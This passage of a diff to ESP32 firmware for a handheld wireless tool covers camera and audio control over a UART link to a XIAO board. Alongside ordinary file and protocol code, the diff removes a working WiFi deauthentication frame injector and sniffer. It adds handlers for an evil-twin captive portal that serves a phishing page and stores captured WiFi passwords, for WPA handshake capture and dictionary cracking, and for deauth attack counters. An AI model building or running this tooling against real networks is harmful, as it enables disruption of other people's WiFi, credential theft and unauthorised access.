+    server.send(ok ? 200 : 500, "text/plain", ok ? "AUDIO_REC_STOP" : "AUDIO_REC_STOP_FAIL");
+    return;
+  }
+  server.send(400, "text/plain", "bad");
+}
+
 static void handleFilesApi() {
   if (!fsReady) { server.send(500, "application/json", "[]"); return; }
   String json = "[";
@@ -6588,6 +8030,38 @@ static void handleFilesApi() {
   }
   json += "]";
   server.send(200, "application/json", json);
+}
+
+static void handleFilesDeleteApi() {
+  if (!fsReady) { server.send(500, "text/plain", "fs not ready"); return; }
+  if (!server.hasArg("path")) { server.send(400, "text/plain", "missing path"); return; }
+  if (!server.hasArg("confirm1") || !server.hasArg("confirm2")) {
+    server.send(400, "text/plain", "need confirm1=yes & confirm2=DELETE");
+    return;
+  }
+
+  String c1 = server.arg("confirm1");
+  String c2 = server.arg("confirm2");
+  c1.toLowerCase();
+  if (c1 != "yes" || c2 != "DELETE") {
+    server.send(403, "text/plain", "verification failed");
+    return;
+  }
+
+  String path = server.arg("path");
+  if (!path.startsWith("/")) path = "/" + path;
+  if (path.indexOf("..") >= 0) { server.send(400, "text/plain", "bad path"); return; }
+
+  String lower = path;
+  lower.toLowerCase();
+  if (!(lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".bmp") || lower.endsWith(".gif"))) {
+    server.send(400, "text/plain", "only media files allowed");
+    return;
+  }
+  if (!LittleFS.exists(path)) { server.send(404, "text/plain", "not found"); return; }
+  if (!LittleFS.remove(path)) { server.send(500, "text/plain", "delete failed"); return; }
+
+  server.send(200, "text/plain", "OK");
 }
 
 static void handleFileServe() {
@@ -6633,61 +8107,9 @@ typedef struct {
   uint8_t payload[0];
 } wifi_packet_t;
 
-void performDeauth(uint8_t* targetMac, uint8_t* apMac) {
-    deauth_frame_t frame_deauth;
-    frame_deauth.reason = selectedReason;
-
-    // Alamat ke target
-    memcpy(frame_deauth.station, targetMac, 6);
-    memcpy(frame_deauth.sender, apMac, 6);
-    memcpy(frame_deauth.access_point, apMac, 6);
-    
-    // Kirim Deauth (0xC0, 0x00) (AP -> STA)
-    frame_deauth.frame_control[0] = 0xC0;
-    esp_wifi_80211_tx(WIFI_IF_STA, &frame_deauth, sizeof(deauth_frame_t), false);
-    
-    // Kirim Disassociation (0xA0, 0x00) (AP -> STA)
-    frame_deauth.frame_control[0] = 0xA0;
-    esp_wifi_80211_tx(WIFI_IF_STA, &frame_deauth, sizeof(deauth_frame_t), false);
-
-    if (targetMac[0] != 0xFF) {
-        // Balikin dari Target ke AP (STA -> AP)
-        memcpy(frame_deauth.station, apMac, 6);
-        memcpy(frame_deauth.sender, targetMac, 6);
-        memcpy(frame_deauth.access_point, apMac, 6);
-
-        frame_deauth.frame_control[0] = 0xC0;
-        esp_wifi_80211_tx(WIFI_IF_STA, &frame_deauth, sizeof(deauth_frame_t), false);
-
-        frame_deauth.frame_control[0] = 0xA0;
-        esp_wifi_80211_tx(WIFI_IF_STA, &frame_deauth, sizeof(deauth_frame_t), false);
-    }
-}
-
-IRAM_ATTR void deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
-    if (!deauthKilling) return;
-    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
-    
-    if (pkt->rx_ctrl.sig_len < sizeof(mac_hdr_t)) return;
-
-    wifi_packet_t* packet = (wifi_packet_t*)pkt->payload;
-    mac_hdr_t* hdr = &packet->hdr;
-    
-    if (memcmp(hdr->bssid, deauthTargetBssid, 6) == 0 || memcmp(hdr->dest, deauthTargetBssid, 6) == 0 || memcmp(hdr->src, deauthTargetBssid, 6) == 0) {
-        if (hdr->src[0] != 0xFF && memcmp(hdr->src, deauthTargetBssid, 6) != 0) {
-            uint8_t mac[6];
-            memcpy(mac, hdr->src, 6);
-            performDeauth(mac, deauthTargetBssid);
-            deauthPacketsSent += 4;
-        }
-        if (hdr->dest[0] != 0xFF && memcmp(hdr->dest, deauthTargetBssid, 6) != 0) {
-            uint8_t mac[6];
-            memcpy(mac, hdr->dest, 6);
-            performDeauth(mac, deauthTargetBssid);
-            deauthPacketsSent += 4;
-        }
-    }
-}
+// Offloaded to XIAO
+// void performDeauth(uint8_t* targetMac, uint8_t* apMac) { ... }
+// IRAM_ATTR void deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type) { ... }
 
 static void handleUploadStream() {
   HTTPUpload &up = server.upload();
@@ -6750,23 +8172,457 @@ static bool cameraUrlLoadFromFS() {
   return true;
 }
 
+static bool xiaoWebUrlSaveToFS() {
+  if (!fsReady) return false;
+  File f = LittleFS.open(XIAO_WEB_URL_PATH, "w");
+  if (!f) return false;
+  f.print(xiaoWebUrl);
+  f.close();
+  return true;
+}
+
+static bool xiaoWebUrlLoadFromFS() {
+  if (!fsReady) return false;
+  if (!LittleFS.exists(XIAO_WEB_URL_PATH)) return false;
+  File f = LittleFS.open(XIAO_WEB_URL_PATH, "r");
+  if (!f) return false;
+  String s = f.readStringUntil('\n');
+  f.close();
+  s.trim();
+  if (s.length() == 0) return false;
+  xiaoWebUrl = s;
+  return true;
+}
+
+static void cameraTryExtractAndStoreXiaoWebUrl(const String &statusText) {
+  int pos = statusText.indexOf("http://");
+  if (pos < 0) return;
+  String u = statusText.substring(pos);
+  u.trim();
+  if (u.length() == 0) return;
+  int sp = u.indexOf(' ');
+  if (sp > 0) u = u.substring(0, sp);
+  if (u.endsWith("/")) u.remove(u.length() - 1);
+  if (u.length() == 0) return;
+  if (u != xiaoWebUrl) {
+    xiaoWebUrl = u;
+    (void)xiaoWebUrlSaveToFS();
+  }
+}
+
+static void cameraHandleUartStatusText(const String &statusText) {
+  cameraLastError = statusText;
+  cameraTryExtractAndStoreXiaoWebUrl(statusText);
+  if (statusText == "TIME_REQ") (void)cameraUartSendTimeNow();
+
+  String low = statusText;
+  low.toLowerCase();
+
+  if (low.indexOf("rec started") >= 0) {
+    cameraRecordActive = true;
+    cameraRecordProcessing = false;
+    cameraRecordStartPending = false;
+    cameraRecordStopPending = false;
+    cameraToastMessage = "REC ON";
+    cameraToastUntilMs = millis() + 2000;
+  } else if (low.indexOf("rec processing") >= 0) {
+    cameraRecordActive = true;
+    cameraRecordProcessing = true;
+    cameraRecordStartPending = false;
+    cameraRecordStopPending = false;
+    cameraToastMessage = "Processing...";
+    cameraToastUntilMs = millis() + 2000;
+  } else if (low.indexOf("rec saved") >= 0 || low.indexOf("rec stop") >= 0) {
+    cameraRecordActive = false;
+    cameraRecordProcessing = false;
+    cameraRecordStartPending = false;
+    cameraRecordStopPending = false;
+    cameraToastMessage = "REC saved";
+    cameraToastUntilMs = millis() + 3000;
+  } else if (low.indexOf("rec fail") >= 0) {
+    cameraRecordActive = false;
+    cameraRecordProcessing = false;
+    cameraRecordStartPending = false;
+    cameraRecordStopPending = false;
+    cameraToastMessage = "REC failed";
+    cameraToastUntilMs = millis() + 3000;
+  }
+
+  if (low.startsWith("audio_state ")) {
+    auto getKv = [&](const char *key) -> String {
+      String pat = String(key) + "=";
+      int p = low.indexOf(pat);
+      if (p < 0) return "";
+      p += pat.length();
+      int e = low.indexOf(' ', p);
+      if (e < 0) e = low.length();
+      return low.substring(p, e);
+    };
+
+    String active = getKv("active");
+    String paused = getKv("paused");
+    String sec = getKv("sec");
+    String file = getKv("file");
+    String ev = getKv("event");
+
+    if (active.length() > 0) cameraAudioRecActive = (active == "1");
+    if (paused.length() > 0) cameraAudioRecPaused = (paused == "1");
+    if (sec.length() > 0) cameraAudioRecSeconds = (uint32_t)sec.toInt();
+    if (file.length() > 0) cameraAudioRecFile = file;
+
+    if (ev == "start") cameraAudioRecStateText = "Recording";
+    else if (ev == "pause") cameraAudioRecStateText = "Paused";
+    else if (ev == "resume") cameraAudioRecStateText = "Recording";
+    else if (ev == "saved") cameraAudioRecStateText = "Saved";
+    else if (ev == "tick") cameraAudioRecStateText = cameraAudioRecPaused ? "Paused" : (cameraAudioRecActive ? "Recording" : "Ready");
+  } else if (low.indexOf("audio rec") >= 0 || (low.startsWith("audio ") && low.indexOf("saved") < 0)) {
+    cameraAudioRecActive = true;
+    cameraAudioRecPaused = false;
+    cameraAudioRecStateText = "Recording";
+    int pf = low.indexOf("/voice/");
+    if (pf >= 0) cameraAudioRecFile = statusText.substring(pf);
+  }
+  if (low.indexOf("audio saved") >= 0 || low.indexOf("audio stop") >= 0) {
+    cameraAudioRecActive = false;
+    cameraAudioRecPaused = false;
+    cameraAudioRecStateText = "Saved";
+  }
+  if (low.indexOf("audio pause") >= 0 || low.indexOf("audio paused") >= 0) {
+    cameraAudioRecActive = true;
+    cameraAudioRecPaused = true;
+    cameraAudioRecStateText = "Paused";
+  }
+  if (low.indexOf("audio resume") >= 0 || low.indexOf("audio resumed") >= 0) {
+    cameraAudioRecActive = true;
+    cameraAudioRecPaused = false;
+    cameraAudioRecStateText = "Recording";
+  }
+
+  if (low.startsWith("wpa_cap ")) {
+    auto getKv = [&](const char *key) -> String {
+      String pat = String(key) + "=";
+      int p = low.indexOf(pat);
+      if (p < 0) return "";
+      p += pat.length();
+      int e = low.indexOf(' ', p);
+      if (e < 0) e = low.length();
+      return low.substring(p, e);
+    };
+
+    String state = getKv("state");
+    String ch = getKv("ch");
+    String data = getKv("data");
+    String eapol = getKv("eapol");
+    String m1 = getKv("m1");
+    String m2 = getKv("m2");
+
+    if (state.length() > 0) {
+      state.toUpperCase();
+      state.replace("_", " ");
+      crackerCaptureStage = state;
+    }
+
+    crackerCaptureMetrics = "CH:" + (ch.length() ? ch : "-") +
+                            " D:" + (data.length() ? data : "0") +
+                            " E:" + (eapol.length() ? eapol : "0") +
+                            " M1:" + (m1.length() ? m1 : "0") +
+                            " M2:" + (m2.length() ? m2 : "0");
+
+    if (uiScreen == UI_WIFI_CRACKER_SCAN || uiScreen == UI_WIFI_CRACKER_DICT || uiScreen == UI_WIFI_CRACKER_RUN) {
+      uiMarkDirty();
+    }
+  }
+
+  if (appMode == APP_AUDIO_RECORD || uiScreen == UI_MEDIA_MENU) {
+    uiMarkDirty();
+  }
+}
+
+static void cameraUartBackgroundPoll() {
+  bool needPoll = webServerRunning || (appMode == APP_AUDIO_RECORD) || cameraAudioRecActive;
+  // Always poll during scan/attack/cracker screens so UART status/results stay live.
+  if (uiScreen == UI_WIFI_LIST ||
+      uiScreen == UI_DEAUTH_SCANNER ||
+      uiScreen == UI_DEAUTH_ATTACK ||
+      uiScreen == UI_WIFI_CRACKER_SCAN ||
+      uiScreen == UI_WIFI_CRACKER_DICT ||
+      uiScreen == UI_WIFI_CRACKER_RUN ||
+      uiScreen == UI_IP_SCANNING ||
+      uiScreen == UI_EVIL_TWIN_SCAN ||
+      uiScreen == UI_EVIL_TWIN_RUN) {
+      needPoll = true;
+  }
+  
+  if (!needPoll) return;
+  if (appMode == APP_CAMERA) return;
+  if (!cameraIsUartMode()) return;
+  if (!cameraUartEnsureInit()) return;
+  if (Serial1.available() <= 0) return;
+
+  uint8_t type = 0;
+  uint16_t len = 0;
+  if (!cameraUartReadPacket(type, cameraUartPayloadBuf, sizeof(cameraUartPayloadBuf), len)) return;
+
+  if (type == CAM_PKT_STATUS) {
+    String s = "";
+    for (uint16_t i = 0; i < len; i++) s += (char)cameraUartPayloadBuf[i];
+    cameraHandleUartStatusText(s);
+  } else if (type == CAM_PKT_WIFI_SCAN_RES) {
+    if (len >= 64) {
+       uint8_t idx = cameraUartPayloadBuf[0];
+       if (idx < WIFI_SCAN_MAX) {
+           deauthScanChannels[idx] = cameraUartPayloadBuf[1];
+           wifiScanRssi[idx]       = -((int)cameraUartPayloadBuf[2]); 
+           memcpy(deauthScanBssids[idx], &cameraUartPayloadBuf[3], 6);
+           // Simpan Encryption Type (WIFI_AUTH_...) - di custom index tersendiri
+           // Agar hemat memori saya manfaatkan wifiScanAuth yang baru
+           wifiScanAuth[idx] = cameraUartPayloadBuf[9]; 
+           
+           char ssidBuf[53];
+           memcpy(ssidBuf, &cameraUartPayloadBuf[10], 52);
+           ssidBuf[52] = '\0';
+           wifiScanSsids[idx] = String(ssidBuf);
+
+           if (idx >= wifiScanCount) {
+               wifiScanCount = idx + 1;
+           }
+           wifiStatusMessage = "Select target";
+           if (uiScreen == UI_EVIL_TWIN_SCAN || uiScreen == UI_WIFI_CRACKER_SCAN || uiScreen == UI_DEAUTH_SCANNER) uiMarkDirty();
+       }
+    }
+  } else if (type == CAM_PKT_DEAUTH_ATK_STAT) {
+    if (len == 4) {
+        uint32_t sent = *((uint32_t*)cameraUartPayloadBuf);
+        deauthPacketsSent = sent;
+        uiMarkDirty();
+    }
+  } else if (type == CAM_PKT_LAN_SCAN_STAT) {
+    // (Moved to Matrix natively)
+  } else if (type == CAM_PKT_FILE_PULL_RES) {
+    if (evilTwinState == EVIL_TWIN_PULLING) {
+      if (len == 5 && cameraUartPayloadBuf[0] == 1) {
+        evilTwinFile = LittleFS.open("/phish.html", "w");
+        memcpy(&evilTwinPullSize, &cameraUartPayloadBuf[1], 4);
+        evilTwinPullRecv = 0;
+        evilTwinStatusMsg = "Pulling... 0%";
+        uiMarkDirty();
+      } else {
+        evilTwinStatusMsg = "No SD file. Fallback AP.";
+        evilTwinState = EVIL_TWIN_RUNNING;
+        startMatrixCaptivePortal();
+        uiMarkDirty();
+      }
+    }
+  } else if (type == CAM_PKT_FILE_PULL_CHUNK) {
+    if (evilTwinState == EVIL_TWIN_PULLING && evilTwinFile && len >= 2) {
+      uint16_t seq = cameraUartPayloadBuf[0] | (cameraUartPayloadBuf[1] << 8);
+      size_t chunkLen = len - 2;
+      if (chunkLen > 0) {
+        evilTwinFile.write(&cameraUartPayloadBuf[2], chunkLen);
+        evilTwinPullRecv += chunkLen;
+        int pct = 0;
+        if (evilTwinPullSize > 0) pct = (evilTwinPullRecv * 100) / evilTwinPullSize;
+        evilTwinStatusMsg = "Pulling... " + String(pct) + "%";
+        uiMarkDirty();
+      }
+      uint8_t ackPayload[2];
+      ackPayload[0] = seq & 0xFF;
+      ackPayload[1] = (seq >> 8) & 0xFF;
+      cameraUartSendPacket(CAM_PKT_FILE_PULL_ACK, ackPayload, 2);
+    }
+  } else if (type == CAM_PKT_FILE_PULL_END) {
+    if (evilTwinState == EVIL_TWIN_PULLING) {
+      if (evilTwinFile) evilTwinFile.close();
+      evilTwinState = EVIL_TWIN_RUNNING;
+      evilTwinStatusMsg = "File Ready! Starting AP...";
+      startMatrixCaptivePortal();
+      uiMarkDirty();
+    }
+  } else if (type == CAM_PKT_EVIL_TWIN_STAT) {
+      // reserved for Evil AP status updates if needed
+  } else if (type == CAM_PKT_EVIL_TWIN_CREDS) {
+    String pwd = "";
+    for(int i = 0; i < len; i++) {
+        pwd += (char)cameraUartPayloadBuf[i];
+    }
+    // Save exactly like the internal logic
+    if (evilTwinCapturedCount < MAX_EVIL_TWIN_PASSWORDS) {
+        evilTwinCapturedPwds[evilTwinCapturedCount++] = pwd;
+    } else {
+        for (int i = 0; i < MAX_EVIL_TWIN_PASSWORDS - 1; i++) {
+            evilTwinCapturedPwds[i] = evilTwinCapturedPwds[i+1];
+        }
+        evilTwinCapturedPwds[MAX_EVIL_TWIN_PASSWORDS - 1] = pwd;
+    }
+    uiMarkDirty();
+  } else if (type == CAM_PKT_CRACK_DICT_RES) {
+    if (len == 2 && cameraUartPayloadBuf[0] == 0) {
+      crackerDictReqDone = true;
+    } else if (len > 2 && cameraUartPayloadBuf[0] == 1) {
+      crackerDictReqDone = false;
+        if (crackerDictCount < CRACKER_DICT_MAX) {
+            String fname = "";
+            for(int i = 2; i < len; i++) {
+                if (cameraUartPayloadBuf[i] == 0) break;
+                fname += (char)cameraUartPayloadBuf[i];
+            }
+            if (fname.length() > 0) {
+                bool exists = false;
+                for (uint8_t i = 0; i < crackerDictCount; i++) {
+                  if (crackerDictFiles[i] == fname) {
+                    exists = true;
+                    break;
+                  }
+                }
+                if (!exists) {
+                  crackerDictFiles[crackerDictCount++] = fname;
+                }
+            }
+        }
+    }
+    uiMarkDirty();
+  } else if (type == CAM_PKT_CRACK_STAT) {
+    if (len >= 2) {
+        uint8_t mode = cameraUartPayloadBuf[0];
+        if (mode == 1) { // Capture mode 
+            crackerHandshakeFound = (cameraUartPayloadBuf[1] == 1);
+        } else if (mode == 2) { // Crack mode
+            if (len >= 6) {
+                uint32_t tested = 0;
+                memcpy(&tested, &cameraUartPayloadBuf[2], 4);
+                crackerHashTested = tested;
+                if (cameraUartPayloadBuf[1] == 1) { // Found
+                    crackerDone = true;
+                    crackerPassword = "";
+                    for(int i = 6; i < len; i++) {
+                       if (cameraUartPayloadBuf[i] == 0) break;
+                       crackerPassword += (char)cameraUartPayloadBuf[i];
+                    }
+                } else if (cameraUartPayloadBuf[1] == 2) { // Exhausted
+                    crackerDone = true;
+                }
+            }
+        }
+    }
+    uiMarkDirty();
+  }
+}
+
 static void cameraStop() {
   if (cameraBmpFile) cameraBmpFile.close();
   if (cameraClient.connected()) cameraClient.stop();
+  if (cameraUartReady) {
+    while (Serial1.available() > 0) Serial1.read();
+  }
   // fully reset client object to clear any stale state
   cameraClient = WiFiClient();
   cameraStreamReady = false;
   cameraBoundary = "";
   cameraCaptureActive = false;
   cameraCapturePending = false;
+  cameraRecordStartPending = false;
+  cameraRecordStopPending = false;
+  cameraRecordActive = false;
   cameraLastConnectMs = 0;
   cameraLastFrameMs = 0;
   cameraLastDisplayMs = 0;
+  if (cameraUartCaptureFile) cameraUartCaptureFile.close();
+  cameraUartCaptureInProgress = false;
+  cameraUartCaptureCommandSent = false;
+  cameraUartCaptureExpected = 0;
+  cameraUartCaptureReceived = 0;
+  cameraUartCaptureNextSeq = 0;
+  cameraUartCaptureDeadlineMs = 0;
+  cameraUartCaptureLastDataMs = 0;
+  cameraUartNeedClear = true;
+  cameraUartHavePrev = false;
+  cameraUartResetFrameState();
   // don't clear fail count here so callers can set backoff when appropriate
 }
 
 static void cameraCaptureRequest() {
   cameraCapturePending = true;
+}
+
+static void cameraRecordStartRequest() {
+  cameraRecordStartPending = true;
+  cameraRecordStopPending = false;
+  cameraRecordProcessing = false;
+  cameraRecordActive = true;
+  cameraToastMessage = "REC start...";
+  cameraToastUntilMs = millis() + 1200;
+}
+
+static void cameraRecordStopRequest() {
+  cameraRecordStopPending = true;
+  cameraRecordStartPending = false;
+  cameraRecordProcessing = true;
+  cameraRecordActive = true;
+  cameraToastMessage = "REC stop...";
+  cameraToastUntilMs = millis() + 1500;
+}
+
+static void cameraRequestSdList() {
+  cameraSdListPending = true;
+  cameraSdListLoading = true;
+  cameraSdListRequestMs = millis();
+}
+
+static bool cameraFetchSdListSync(uint32_t timeoutMs) {
+  if (!cameraIsUartMode()) {
+    cameraSdListPending = false;
+    cameraSdListLoading = false;
+    cameraSdListCache = "Camera not in UART mode";
+    return false;
+  }
+  if (!cameraUartEnsureInit()) {
+    cameraSdListPending = false;
+    cameraSdListLoading = false;
+    cameraSdListCache = "UART init failed";
+    return false;
+  }
+
+  cameraSdListPending = false;
+  cameraSdListLoading = true;
+  cameraSdListRequestMs = millis();
+  cameraSdListCache = "";
+
+  if (!cameraUartSendSimpleCommand(CAM_CMD_SD_LIST)) {
+    cameraSdListLoading = false;
+    cameraSdListCache = "SD list cmd failed";
+    return false;
+  }
+
+  uint32_t deadline = millis() + timeoutMs;
+  while ((int32_t)(deadline - millis()) > 0) {
+    uint8_t type = 0;
+    uint16_t len = 0;
+    if (!cameraUartReadPacket(type, cameraUartPayloadBuf, sizeof(cameraUartPayloadBuf), len)) {
+      continue;
+    }
+
+    if (type == CAM_PKT_SD_LIST_CHUNK) {
+      for (uint16_t i = 0; i < len; i++) cameraSdListCache += (char)cameraUartPayloadBuf[i];
+      continue;
+    }
+    if (type == CAM_PKT_SD_LIST_END) {
+      if (cameraSdListCache.length() == 0) cameraSdListCache = "(empty)\n";
+      cameraSdListLoading = false;
+      cameraSdListLastUpdateMs = millis();
+      cameraSdListRequestMs = 0;
+      return true;
+    }
+    if (type == CAM_PKT_STATUS) {
+      String s = "";
+      for (uint16_t i = 0; i < len; i++) s += (char)cameraUartPayloadBuf[i];
+      cameraLastError = s;
+      cameraTryExtractAndStoreXiaoWebUrl(s);
+    }
+  }
+
+  cameraSdListLoading = false;
+  if (cameraSdListCache.length() == 0) cameraSdListCache = "SD list timeout";
+  return false;
 }
 
 static bool cameraParseUrl(const String &url, String &host, uint16_t &port, String &path) {
@@ -6784,6 +8640,1028 @@ static bool cameraParseUrl(const String &url, String &host, uint16_t &port, Stri
     port = 80;
   }
   return host.length() > 0 && port > 0;
+}
+
+static bool cameraIsUartMode() {
+  String u = cameraUrl;
+  u.trim();
+  u.toLowerCase();
+  return u.startsWith("uart://");
+}
+
+static bool cameraUartEnsureInit() {
+  if (cameraUartReady) return true;
+  Serial1.setRxBufferSize(16384);
+  Serial1.begin(CAM_UART_BAUD, SERIAL_8N1, CAM_UART_RX_PIN, CAM_UART_TX_PIN);
+  cameraUartReady = true;
+  cameraStreamReady = true;
+  cameraUartResetFrameState();
+  cameraUartComputeLayout();
+  cameraLastError = "";
+  return true;
+}
+
+static bool cameraUartReadBytes(uint8_t *buf, size_t len, uint32_t timeoutMs) {
+  size_t got = 0;
+  uint32_t start = millis();
+  while (got < len && (millis() - start) < timeoutMs) {
+    int avail = Serial1.available();
+    if (avail > 0) {
+      int toRead = (int)min<size_t>((size_t)avail, len - got);
+      int n = Serial1.readBytes((char *)(buf + got), toRead);
+      if (n > 0) got += (size_t)n;
+    } else {
+      delay(1);
+    }
+  }
+  return got == len;
+}
+
+static uint8_t cameraUartCrc8Update(uint8_t crc, uint8_t data) {
+  crc ^= data;
+  for (int i = 0; i < 8; i++) {
+    crc = (crc & 0x80) ? (uint8_t)((crc << 1) ^ 0x31) : (uint8_t)(crc << 1);
+  }
+  return crc;
+}
+
+static uint8_t cameraUartCrc8Buf(const uint8_t *buf, size_t len) {
+  uint8_t c = 0;
+  for (size_t i = 0; i < len; i++) c = cameraUartCrc8Update(c, buf[i]);
+  return c;
+}
+
+static bool cameraUartSendPacket(uint8_t type, const uint8_t *payload, uint16_t len) {
+  if (CAM_UART_TX_PIN < 0 || !cameraUartReady) return false;
+
+  uint8_t hdr[5];
+  hdr[0] = CAM_PKT_HEAD1;
+  hdr[1] = CAM_PKT_HEAD2;
+  hdr[2] = type;
+  hdr[3] = (uint8_t)(len & 0xFF);
+  hdr[4] = (uint8_t)((len >> 8) & 0xFF);
+
+  uint8_t crc = 0;
+  crc = cameraUartCrc8Update(crc, hdr[2]);
+  crc = cameraUartCrc8Update(crc, hdr[3]);
+  crc = cameraUartCrc8Update(crc, hdr[4]);
+  if (payload && len > 0) {
+    for (uint16_t i = 0; i < len; i++) {
+      crc = cameraUartCrc8Update(crc, payload[i]);
+    }
+  }
+
+  Serial1.write(hdr, sizeof(hdr));
+  if (payload && len > 0) Serial1.write(payload, len);
+  Serial1.write(crc);
+  Serial1.write(CAM_PKT_TAIL1);
+  Serial1.write(CAM_PKT_TAIL2);
+  return true;
+}
+
+static bool cameraUartSendCaptureAck(uint16_t seq) {
+  uint8_t ack[2] = {
+    (uint8_t)(seq & 0xFF),
+    (uint8_t)((seq >> 8) & 0xFF)
+  };
+  return cameraUartSendPacket(CAM_PKT_CAPTURE_ACK, ack, sizeof(ack));
+}
+
+static bool cameraUartSendControlState() {
+  uint8_t payload[5] = {
+    CAM_CMD_SET_STREAM_CTRL,
+    (uint8_t)(cameraCtlFilter % CAM_FILTER_COUNT),
+    (uint8_t)(cameraCtlBrightness + 4),
+    (uint8_t)(cameraCtlContrast + 4),
+    (uint8_t)(cameraCtlSaturation + 4)
+  };
+  return cameraUartSendPacket(CAM_PKT_CMD, payload, sizeof(payload));
+}
+
+static bool cameraUartSendSimpleCommand(uint8_t cmd) {
+  return cameraUartSendPacket(CAM_PKT_CMD, &cmd, 1);
+}
+
+static bool cameraUartSendWebServerState(bool enabled) {
+  uint8_t payload[2] = {CAM_CMD_WEB_SERVER, enabled ? 1 : 0};
+  return cameraUartSendPacket(CAM_PKT_CMD, payload, sizeof(payload));
+}
+
+static bool cameraUartSendWifiConfig(const String &ssid, const String &password) {
+  if (ssid.length() == 0) return false;
+
+  String s = ssid;
+  String p = password;
+  if (s.length() > 31) s = s.substring(0, 31);
+  if (p.length() > 63) p = p.substring(0, 63);
+
+  uint8_t payload[3 + 31 + 63];
+  uint8_t ssidLen = (uint8_t)s.length();
+  uint8_t passLen = (uint8_t)p.length();
+  payload[0] = CAM_CMD_WIFI_CFG;
+  payload[1] = ssidLen;
+  payload[2] = passLen;
+  if (ssidLen > 0) memcpy(payload + 3, s.c_str(), ssidLen);
+  if (passLen > 0) memcpy(payload + 3 + ssidLen, p.c_str(), passLen);
+  return cameraUartSendPacket(CAM_PKT_CMD, payload, (uint16_t)(3 + ssidLen + passLen));
+}
+
+static bool cameraUartSendTimeNow() {
+  uint32_t ts = (uint32_t)time(nullptr);
+  if (ts < 100000) ts = millis() / 1000;
+  uint8_t payload[5] = {
+    CAM_CMD_TIME_SET,
+    (uint8_t)(ts & 0xFF),
+    (uint8_t)((ts >> 8) & 0xFF),
+    (uint8_t)((ts >> 16) & 0xFF),
+    (uint8_t)((ts >> 24) & 0xFF)
+  };
+  return cameraUartSendPacket(CAM_PKT_CMD, payload, sizeof(payload));
+}
+
+static bool cameraUartSendAudioRecord(bool start) {
+  return cameraUartSendSimpleCommand(start ? CAM_CMD_AUDIO_REC_START : CAM_CMD_AUDIO_REC_STOP);
+}
+
+static bool cameraUartSendAudioPause() {
+  return cameraUartSendSimpleCommand(CAM_CMD_AUDIO_REC_PAUSE);
+}
+
+static bool cameraUartSendAudioResume() {
+  return cameraUartSendSimpleCommand(CAM_CMD_AUDIO_REC_RESUME);
+}
+
+static bool cameraUartSendJpgToXiao(const String &path) {
+  if (!cameraIsUartMode() || !cameraUartEnsureInit()) return false;
+  if (!fsReady) return false;
+  if (!LittleFS.exists(path)) return false;
+
+  if (!tftSleeping) {
+    tft.fillRoundRect(20, 88, 200, 64, 10, UI_CARD);
+    tft.drawRoundRect(20, 88, 200, 64, 10, UI_ACCENT);
+    tft.setTextSize(2);
+    tft.setTextColor(UI_TEXT);
+    tft.setCursor(30, 102);
+    tft.print("Sending...");
+    tft.setTextSize(1);
+    tft.setTextColor(UI_MUTED);
+    tft.setCursor(30, 126);
+    tft.print("Wait XIAO reply");
+  }
+
+  auto drawResultPopup = [&](const String &msg, uint16_t borderColor) {
+    if (tftSleeping) return;
+    tft.fillRoundRect(20, 88, 200, 64, 10, UI_CARD);
+    tft.drawRoundRect(20, 88, 200, 64, 10, borderColor);
+    tft.setTextSize(1);
+    tft.setTextColor(UI_TEXT);
+    tft.setCursor(30, 106);
+    tft.print(msg);
+  };
+
+  File f = LittleFS.open(path, "r");
+  if (!f) {
+    drawResultPopup("Send fail: open file", UI_WARN);
+    delay(1400);
+    return false;
+  }
+  uint32_t total = (uint32_t)f.size();
+  if (total == 0 || total > (1024UL * 1024UL * 4UL)) {
+    f.close();
+    drawResultPopup("Send fail: bad size", UI_WARN);
+    delay(1400);
+    return false;
+  }
+
+  String name = path;
+  int slash = name.lastIndexOf('/');
+  if (slash >= 0) name = name.substring(slash + 1);
+  if (name.length() == 0) name = "image.jpg";
+  if (name.length() > 40) name = name.substring(name.length() - 40);
+  uint8_t nameLen = (uint8_t)name.length();
+
+  uint8_t startPayload[2 + 40 + 4];
+  startPayload[0] = CAM_CMD_FILE_PUSH_START;
+  startPayload[1] = nameLen;
+  memcpy(startPayload + 2, name.c_str(), nameLen);
+  startPayload[2 + nameLen + 0] = (uint8_t)(total & 0xFF);
+  startPayload[2 + nameLen + 1] = (uint8_t)((total >> 8) & 0xFF);
+  startPayload[2 + nameLen + 2] = (uint8_t)((total >> 16) & 0xFF);
+  startPayload[2 + nameLen + 3] = (uint8_t)((total >> 24) & 0xFF);
+  if (!cameraUartSendPacket(CAM_PKT_CMD, startPayload, (uint16_t)(2 + nameLen + 4))) {
+    f.close();
+    drawResultPopup("Send fail: start pkt", UI_WARN);
+    delay(1400);
+    return false;
+  }
+
+  static uint8_t buf[240];
+  static uint8_t pkt[1 + 2 + 240];
+  uint16_t seq = 0;
+  while (f.available()) {
+    size_t n = f.read(buf, sizeof(buf));
+    if (n == 0) break;
+    pkt[0] = CAM_CMD_FILE_PUSH_CHUNK;
+    pkt[1] = (uint8_t)(seq & 0xFF);
+    pkt[2] = (uint8_t)((seq >> 8) & 0xFF);
+    memcpy(pkt + 3, buf, n);
+    bool chunkOk = false;
+    String chunkFail = "";
+    for (uint8_t attempt = 0; attempt < 6; attempt++) {
+      if (!cameraUartSendPacket(CAM_PKT_CMD, pkt, (uint16_t)(3 + n))) {
+        continue;
+      }
+      if (cameraUartWaitPushChunkAck(seq, 320, chunkFail)) {
+        chunkOk = true;
+        break;
+      }
+      if (chunkFail.length() > 0) break;
+      delay(2);
+    }
+    if (!chunkOk) {
+      f.close();
+      String msg = (chunkFail.length() > 0) ? chunkFail : String("Send fail: chunk ack #") + String(seq);
+      drawResultPopup(msg, UI_WARN);
+      delay(1400);
+      return false;
+    }
+    seq++;
+    if (!tftSleeping && (seq % 24 == 0)) {
+      tft.fillRect(30, 138, 180, 10, UI_CARD);
+      tft.setTextSize(1);
+      tft.setTextColor(UI_MUTED);
+      tft.setCursor(30, 140);
+      tft.print(String((unsigned long)((f.position() * 100UL) / (total ? total : 1))) + "%");
+    }
+    delay(1);
+  }
+  f.close();
+
+  uint8_t endPayload[1] = {CAM_CMD_FILE_PUSH_END};
+  if (!cameraUartSendPacket(CAM_PKT_CMD, endPayload, sizeof(endPayload))) {
+    drawResultPopup("Send fail: end pkt", UI_WARN);
+    delay(1400);
+    return false;
+  }
+
+  String pushStatus = "";
